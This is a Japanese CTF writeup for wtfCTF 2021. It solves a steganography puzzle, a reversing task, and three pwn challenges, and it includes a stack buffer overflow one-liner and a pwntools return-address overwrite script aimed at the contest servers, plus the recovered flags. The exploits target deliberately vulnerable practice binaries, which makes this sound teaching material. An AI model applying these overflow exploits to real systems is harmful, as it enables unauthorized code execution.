---
title: "wtfCTF 2021 Writeup"
date: 2021-06-06T21:00:00+09:00
lastmod: 2021-06-06T21:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fwtfctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://wtfctf.wearemist.in/challenges](https://wtfctf.wearemist.in/challenges)
<br /><br />

856点を獲得し、最終順位は63位でした。<br />
<img src="https://captureamerica.github.io/writeups/img/wtfctf_2021_score.png" alt="wtfctf_2021_score.png">

<br>

以下はチャレンジのリストです。<br />

<img src="https://captureamerica.github.io/writeups/img/wtfctf_2021_solves1.png" alt="wtfctf_2021_solves1.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/wtfctf_2021_solves2.png" alt="wtfctf_2021_solves2.png">

<br><br>

Misc の m15tery_Box も解けたんですが、何回フラグをSubmitしても色が緑にならないなぁと思っていたら、いつの間にかイベントが終了してました。。。ということで、結構未着手です。

CTFTimeに記載されている開催期間はあてにしてはいけないことを学びました。



<br /><br />
## [Misc]: m15tery_Box (100 points)
- - -
### Challenge
> I keep losing my “keys”. Can you help me find it?

Attachment:

- LSBmy5t3ry80x.png


<br />
### Solution
PNG画像を foremost にかけると zipファイルが出てきます。

<br />

zipファイルの中身は以下の通りです。
<pre>
$ zipinfo 00000004.zip
Archive:  00000004.zip
Zip file size: 8459 bytes, number of entries: 33
drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 16:13 My5t3rY/
drwxr-xr-x  6.3 unx        0 bx stor 21-May-14 14:31 My5t3rY/.not here/
-rw-r--r--  6.3 unx       99 Bx u099 21-May-16 17:48 My5t3rY/.not here/flag.txt
drwxr-xr-x  6.3 unx        0 bx stor 21-May-14 17:09 My5t3rY/here/
-rw-r--r--  6.3 unx     6148 Bx u099 21-May-19 04:30 My5t3rY/here/.DS_Store
drwxr-xr-x  6.3 unx        0 bx stor 21-May-14 14:35 My5t3rY/here/.nope/
-rw-r--r--  6.3 unx       61 Bx u099 21-May-14 14:35 My5t3rY/here/.nope/part1?.txt
drwxr-xr-x  6.3 unx        0 bx stor 21-May-14 14:49 My5t3rY/here/nope/
-rw-r--r--  6.3 unx       88 Bx u099 21-May-14 14:49 My5t3rY/here/nope/.nope.txt
drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:06 My5t3rY/here/not here/
-rw-r--r--  6.3 unx     6148 Bx u099 21-May-19 04:30 My5t3rY/here/not here/.DS_Store
-rw-r--r--  6.3 unx      104 Bx u099 21-May-14 14:51 My5t3rY/here/not here/.confirmation.txt
drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 03:33 My5t3rY/here/not here/no/
-rw-r--r--  6.3 unx       83 Bx u099 21-May-19 04:35 My5t3rY/here/not here/no/maybe
-rw-r--r--  6.3 unx       65 Bx u099 21-May-19 03:37 My5t3rY/here/not here/no/maybe not
drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 04:30 My5t3rY/here/not here/yes/
-rw-r--r--  6.3 unx     6148 Bx u099 21-May-19 04:30 My5t3rY/here/not here/yes/.DS_Store
-rw-r--r--  6.3 unx       59 Bx u099 21-May-19 04:32 My5t3rY/here/not here/yes/roll
-rw-r--r--  6.3 unx       34 Bx u099 21-May-16 17:47 My5t3rY/hint
drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 16:13 My5t3rY/or here/
drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:16 My5t3rY/or here/.Noob/
drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:18 My5t3rY/or here/.Noob/Are you/
-rw-r--r--  6.3 unx      478 Bx u099 21-May-19 04:11 My5t3rY/or here/.Noob/Are you/.still a noob
drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:17 My5t3rY/or here/.Noob/a noob?/
-rw-r--r--  6.3 unx       78 Bx u099 21-May-19 04:20 My5t3rY/or here/.Noob/a noob?/hehe noob
-rw-r--r--  6.3 unx       47 Bx u099 21-May-19 03:58 My5t3rY/or here/.something
drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 16:13 My5t3rY/or here/Don't ask me/
drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:14 My5t3rY/or here/Don't ask me/OKAY/
-rw-r--r--  6.3 unx      241 Bx u099 21-May-19 04:04 My5t3rY/or here/Don't ask me/OKAY/if you insist
drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 16:13 My5t3rY/or here/don't know/
-rw-r--r--  6.3 unx      627 Bx u099 21-May-19 03:57 My5t3rY/or here/don't know/.chain.zip
drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:05 My5t3rY/or here/don't know/Not telling/
-rw-r--r--  6.3 unx       66 Bx u099 21-May-19 03:41 My5t3rY/or here/don't know/Not telling/not again
</pre>


unzipで解凍したところ、暗号化されたファイルが出てこなかったので、WindowsのExplzhで解凍することにしました。

暗号化されたファイルのパスワードは、zstegで取れる以下でした。
<pre>
b1,rgb,lsb,xy       .. text: "Pr1v4cY15@MytH"
</pre>

<br />

フラグは3箇所に分かれているそうです。

関係ないDecoyもいくつかありました。 (rot13とか、bacon-cipherとか、nak-nak-duckspeakとか、XORとか)

<br />
[Part1]

Filename: 'meow' (以下が中身)

<pre>
Kmmmmm. Czmz tjp cvqz ocz admno Kvmo


roaXOA{di
</pre>

quipquipで解けます。一番近いのを選んで、間違っている箇所は手動で修正。

<pre>
-2.846	Prrrrr. Here byu have the first Part wtfOTF{in
</pre>

`wtfCTF{in`


<br /><br />

[Part2]

Filename: 'maybe' (以下が中身)

<pre>
[part 2] XD



X1RocjMzXw==



this is the flag, but it isn't. Keep this in mind. 
</pre>

Base64デコードで解けます。

`_Thr33_`



<br /><br />

[Part3]

Filename: 'hehe noob' (以下が中身)

<pre>
VGhpcyBpcyB0aGUgbGFzdCBiaXQuCgoKW1BhcnQzXQoKCnBBciFzfQo=
</pre>

Base64デコードで解けます。

<pre>
This is the last bit.\n\n\n[Part3]\n\n\npAr!s}
</pre>

`pAr!s}`

<br />

Flag: `wtfCTF{in_Thr33_pAr!s}`




<br /><br />
## [Pwn]: MoM5m4g1c (100 points)
- - -
### Challenge
> Son:I want my chocolate mom! Mother: Fill the water bottle son! :)
<br /><br />
nc 20.42.99.115 3000

Attachment:

- MoM5m4g1C.c

以下が中身です。

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  int water;
  char bottle[125];

  water = 0;
  printf("Fill the water bottle kid!");
  gets(bottle);

  if(water != 0) {
      system("cat gift.txt");
  } else {
      printf("You are crazy lazy!:)\n");
  }
}
```

<br />
### Solution
提供されたのがC言語のソースコードのみで、バイナリはありません。

ソースを見ると、BOFを起こしてローカル変数waterを0以外の値で上書きするだけのようです。

テキトーにBOFを起こしました。

<pre>
$ (python -c 'print("A"*150)' ; cat - ) | nc 20.42.99.115 3000

wtfCTF{N1c3!n0w_U_c4N_34t_uR_Ch0c0L4t3}Fill the water bottle kid!
</pre>

<br />

Flag: `wtfCTF{N1c3!n0w_U_c4N_34t_uR_Ch0c0L4t3}`



<br /><br />
## [Pwn]: k3Y (150 points)
- - -
### Challenge
> Do you have the key to escape from this room?
<br /><br />
nc 20.42.99.115 3143

Attachment:

- k3Y (ELF 64bit)



<br />
### Solution
まず、Ghidraでコードを確認します。

{{< highlight c "linenos=table,hl_lines=7 11" >}}
undefined8 main(void)

{
  uint local_10;
  uint local_c;
  
  local_c = rand();
  local_10 = 0;
  printf("Enter the Key: ");
  __isoc99_scanf(&DAT_00102018,&local_10);
  if ((local_10 ^ local_c) == 0xacedface) {
    puts("Yayy! U made it!");
    system("cat flag");
  }
  else {
    puts("Oops!, Best of luck with trying the other 2^32 cases.");
  }
  return 0;
}
{{< / highlight >}}

<br />
rand()にSEEDを食わせていないので、毎回同じ値になりそうです。

gdbで見た所、rand()の戻り地は以下の値になってました。
<pre>
$rax   : 0x6b8b4567
</pre>

<br />
入力すべき値 (local_10に入る値) はXORで求められます。
<pre>
$ python3
>>> 0x6b8b4567^0xacedface
3345399721
</pre>

<br />

実行結果：

<pre>
$ nc 20.42.99.115 3143
3345399721
wtfCTF{c0n80!_Th15_i5_tH3_fL48}
Enter the Key: Yayy! U made it!
</pre>

<br />

Flag: `wtfCTF{c0n80!_Th15_i5_tH3_fL48}`



<br /><br />
## [Pwn]: Pr1ns0n_Br34k (500 pointsくらい)
- - -
### Challenge
> Really? Do u really want to break the prison you built on your own? You are insane!
<br /><br />
nc 20.42.99.115 3213

Attachment:

- prison (ELF 64bit)



<br />
### Solution
まず、Ghidraでコードを確認します。

main()から、build_prison()を呼んでいます。

{{< highlight c "linenos=table,hl_lines=17" >}}
bool main(void)

{
  int iVar1;
  undefined local_58 [52];
  int local_24;
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  __gid_t local_c;
  
  local_c = getegid();
  setresgid(local_c,local_c,local_c);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  build_prison(local_58);
  iVar1 = local_24 * local_20 * local_1c;
  local_18 = local_18 * local_1c * local_14;
  if (local_18 < iVar1) {
    puts("Prisoners escaped from your prison");
  }
  else {
    puts("Oh god! Your prison is a mini-hell for the prisoners.");
  }
  return local_18 < iVar1;
}
{{< / highlight >}}

<br />

build_prison()の中でもローカル変数が定義されており、ここでBOFが起こせます。

{{< highlight c "linenos=table,hl_lines=4 31" >}}
undefined8 * build_prison(undefined8 *param_1)

{
  char local_a8 [64];
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  
  printf("Enter the number of prisoners per cell in your prison: ");
  __isoc99_scanf(&DAT_00402050,(long)&local_38 + 4);
  getchar();
  printf("Enter the number of cells per each block in your prison: ");
  __isoc99_scanf(&DAT_00402050,&local_30);
  getchar();
  printf("Enter the number of blocks in your prison: ");
  __isoc99_scanf(&DAT_00402050,(long)&local_30 + 4);
  getchar();
  printf("Enter the number of gates per block in your prison: ");
  __isoc99_scanf(&DAT_00402050,(long)&local_28 + 4);
  getchar();
  printf("Enter the number of cops for each gate in your prison: ");
  __isoc99_scanf(&DAT_00402050,&local_28);
  getchar();
  printf("Where is this prison: ");
  gets(local_a8);
  strcpy(local_a8,(char *)&local_68);
  *param_1 = local_68;
  param_1[1] = local_60;
  param_1[2] = local_58;
  param_1[3] = local_50;
  param_1[4] = local_48;
  param_1[5] = local_40;
  param_1[6] = local_38;
  param_1[7] = local_30;
  param_1[8] = local_28;
  return param_1;
}
{{< / highlight >}}

<br />

flag()関数も用意されています。

{{< highlight c "linenos=table,hl_lines=" >}}
void flag(void)

{
  system("cat flag.txt");
  return;
}
{{< / highlight >}}

<br />

checksecの出力結果。

<pre>
$ checksec prison
[*] '/home/captureamerica/OneDrive/CTF/wtfctf_2021/prison'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre>

<br />

結局、build_prison()でBOFを起こしてflag()関数を呼ぶだけのことで、他の箇所は無視しても大丈夫です。

<br />

オフセットは gdb で確認したところ、168バイトでした。


{{< highlight python "linenos=table,hl_lines=" >}}
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
s = remote("20.42.99.115", 3213)
s.sendlineafter(": ", "1")
s.sendlineafter(": ", "1")
s.sendlineafter(": ", "1")
s.sendlineafter(": ", "1")
s.sendlineafter(": ", "1")

elf = ELF('./prison')
addr_flag = elf.symbols["flag"]

payload = ''
payload += b'A' * 168
payload += p64(addr_flag)
s.sendlineafter("Where is this prison: ", payload)
print(s.recvall())
{{< / highlight >}}


<br />

実行結果：

<pre>
$ ./prison_solve.py
wtfCTF{Pr150n3rs_35c4p3d_b3f0r3_3v3n_3nt3r1n8}
</pre>

<br />

Flag: `wtfCTF{Pr150n3rs_35c4p3d_b3f0r3_3v3n_3nt3r1n8}`



<br /><br />
## [Rev]: H3ll0R3v (100 points)
- - -
### Challenge
> Hello bois!

Attachment:

- Hello (python 3.8 byte-compiled)

<br />
### Solution
pycdc と pycdas を使って解きました。

<pre>
$ pycdc Hello
# Source Generated with Decompyle++
# File: Hello (Python 3.8)


def main(input):
    j = -4
    for c in input:
        exit(43)
    if j == -7:
        if c != 'w':
            exit(133)
        elif j == -5:
            if c != 'f':
                exit(42069)
            elif j == -4 and c != 'C':
                exit(11037)
            if j == 7 and c != 'R':
                exit(9001)
            elif j == -2 and c != 'F':
                exit(11037)
        if j == -1 and c != '{':
            exit(11037)
        if j == 4 and c != '3':
            exit(11037)
        if j == 0 and c != '3':
            exit(11037)
        elif j == -3 and c != 'T':
            exit(82)
    if j == 2 and c != '_':
        exit(11037)
    if j == -6 and c != 't':
        exit(133)
    if j == 6:
        if c != 'E':
            exit(133)
        elif j == 9 and c != '3':
            exit(7223)
        elif j == 3 and c != 'R':
            exit(133)
        if j == 5 and c != 'V':
            exit(133)
        if j == 8:
            if c != '5':
                exit(6738)
            elif j == 10 and c != '}':
                exit(1111)
    j += 1
    continue
    print('Hello World')
</pre>

jが位置を示していて、そこに入る文字も見つかります。まとめると`wtfCTF{3 _R3VER53}` になり、一文字足りません。


<br />
足りなかった`Z`は pycdas の出力結果で見つかりました。

<pre>
$ pycdas Hello
Hello (Python 3.8)
[Code]
    File Name: Hello.py
    Object Name: <module>
    Arg Count: 0
    Pos Only Arg Count: 0
    KW Only Arg Count: 0
    Locals: 0
    Stack Size: 2
    Flags: 0x00000040 (CO_NOFREE)
    [Names]
        'main'
    [Var Names]
    [Free Vars]
    [Cell Vars]
    [Constants]
        [Code]
            File Name: Hello.py
            Object Name: main
            Arg Count: 1
            Pos Only Arg Count: 0
            KW Only Arg Count: 0
            Locals: 3
            Stack Size: 3
            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)
            [Names]
                'exit'
                'print'
            [Var Names]
                'input'
                'j'
                'c'
            [Free Vars]
            [Cell Vars]
            [Constants]
                None
                -4
                1
                'Z'  <<
                43
                -7
                'w'
:
(snip)
:
</pre>


<br />

Flag: `wtfCTF{3Z_R3VER53}`


<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

